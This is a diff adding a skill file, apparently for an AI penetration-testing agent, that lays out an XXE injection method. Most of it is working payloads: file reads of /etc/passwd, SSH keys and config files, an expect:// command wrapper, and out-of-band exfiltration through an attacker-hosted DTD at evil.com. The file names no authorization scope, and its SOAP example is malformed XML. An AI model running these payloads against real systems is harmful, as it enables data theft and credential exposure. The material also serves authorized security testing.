@@ -1,0 +1,175 @@
+---
+name: cypher-xxe
+description: XML External Entity injection testing methodology covering in-band, out-of-band, parameter entities, XInclude, SVG injection, SOAP/Office Open XML/PDF XXE, and CDATA exfiltration techniques.
+version: 0.1.0
+owasp: [A03:2021-Injection]
+cwe: [CWE-611]
+finding_types: [PARAMETER, VULN_CANDIDATE, EXPLOIT_RESULT, SECRET_LEAK, OOB_CALLBACK]
+destructiveness: medium
+tags: [web, xxe, xml, file-read, ssrf]
+---
+
+# Cypher XXE Skill
+
+Use this skill when the application parses XML input: SOAP APIs, SAML assertions, SVG uploads, DOCX/XLSX import, RSS/Atom feeds, XML-RPC, or any endpoint accepting `Content-Type: application/xml` or `text/xml`.
+
+## Detection
+
+1. Identify XML endpoints: SOAP services, SAML auth, SVG/image upload, Office document import, XML API bodies, RSS readers, sitemap parsers.
+2. Send a minimal valid XML with an entity definition:
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE foo [<!ENTITY xxe "test">]>
+   <root>&xxe;</root>
+   ```
+3. If the response contains "test" where `&xxe;` was placed, the parser resolves internal entities — XXE is likely.
+4. Test with external entities:
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<dnslog-host>/xxe-test">]>
+   <root>&xxe;</root>
+   ```
+5. Check the DNSLog/callback server for the incoming request.
+
+## In-band XXE (response echoed)
+
+When the parser output is returned in the response:
+
+### File read
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+```
+
+Target files:
+- Linux: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/home/<user>/.ssh/id_rsa`, `/app/.env`
+- Windows: `C:/Windows/win.ini`, `C:/Windows/System32/drivers/etc/hosts`
+- Java properties: `file:///app/WEB-INF/web.xml`, `file:///app/WEB-INF/classes/application.properties`
+- PHP: `file:///var/www/html/config.php`, `php://filter/convert.base64-encode/resource=index.php`
+
+### PHP expect wrapper (if enabled)
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+```
+
+### File read with PHP base64 encoding (bypasses XML restriction on binary/special chars)
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+```
+
+## Out-of-band XXE (blind)
+
+### Basic OOB
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://<dnslog-host>/xxe-oob">
+  %xxe;
+]>
+```
+
+### Parameter entity with DTD
+Host a malicious DTD on a controlled server that exfiltrates data via HTTP:
+```xml
+<!-- attacker-controlled DTD at http://evil.com/evil.dtd -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<dnslog-host>/oob?data=%file;'>">
+%eval;
+%exfil;
+```
+```xml
+<!-- sent to target -->
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
+  %xxe;
+]>
+```
+
+### File limits in OOB
+- Newlines break HTTP parameter values — use `php://filter` to base64-encode first.
+- Special XML characters (`<`, `&`) break the DTD — use CDATA wrapping or `php://filter` to encode.
+
+## XInclude
+
+When the parser does not allow DOCTYPE but supports XInclude:
+```xml
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+```
+Also works with `parse="xml"` and can include remote resources.
+
+## SVG XXE
+
+SVG files are XML and many SVG renderers resolve external entities:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="10" y="20">&xxe;</text>
+</svg>
+```
+
+Upload as profile picture or image attachment — rendered SVG includes file contents.
+
+## Office document XXE
+
+DOCX, XLSX, PPTX are ZIP files containing XML. Inject XXE into the uncompressed XML parts:
+1. Unzip a `.docx`.
+2. Add an external entity to `word/document.xml` or `xl/workbook.xml`.
+3. Re-zip and upload.
+4. If the server parses the document and triggers an OOB callback or returns the rendered content, it's vulnerable.
+
+## SOAP XXE
+
+```xml
+<soap:Body>
+  <foo>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <bar>&xxe;</bar>
+  </foo>
+</soap:Body>
+```
+
+## SAML XXE
+
+SAML assertions are base64-encoded XML. Decode, inject entity before the assertion `</saml:Assertion>`, re-encode, and submit. If the parser resolves the entity, the SAML SP is vulnerable.
+
+## CDATA exfiltration (bypassing XML char restrictions)
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://evil.com/cdata-wrap.dtd">
+  %dtd;
+]>
+```
+Where `cdata-wrap.dtd` wraps `%start;%file;%end;` so the file content is sent as a CDATA-safe payload.
+
+## Evidence rules
+
+- Save the exact XML payload sent and the response to `/mnt/project/exploit/xxe-<endpoint>/`.
+- For OOB XXE, save the callback server log showing the exfiltrated data.
+- For file read, save the recovered file content (redact credentials in the description but keep the file as evidence).
+- Document which parser and version is in use if identifiable.
+
+## Prefix examples
+
+```text
+[cypher:finding type=VULN_CANDIDATE confidence=0.92 severity=high tags=web,xxe,file-read artifacts=/mnt/project/exploit/xxe-upload/ cleanup=none] SVG avatar upload at POST /profile/avatar resolves external entities. `file:///etc/hostname` is rendered in the processed image — confirming XXE in the SVG renderer.
+```
+
+```text
+[cypher:finding type=EXPLOIT_RESULT confidence=0.98 severity=critical tags=web,xxe,oob artifacts=/mnt/project/exploit/xxe-soap/oob-exfil.log cleanup=none] SOAP endpoint POST /service resolves OOB parameter entities. Exfiltrated `/app/WEB-INF/web.xml` via attacker-hosted DTD, confirming DB credentials and internal API keys.
+```
+
+## Common false positives
+
+- The parser resolves internal entities (test with `&xxe;` → "test") but blocks external entities — this is NOT exploitable for file read/SSRF but may still allow DoS via recursive entity expansion ("Billion Laughs"). Document but downgrade severity.
+- The parser resolves external entities but only to whitelisted domains — test with alternative URL schemes (`file://`, `ftp://`, `gopher://`).
+- The parser times out before returning data — this may be a network restriction, not XXE. Verify with shorter payloads or DNS callbacks.
+- Java default SAXParser after JDK 8u331 disables external entity resolution by default — newer Java versions may be immune.
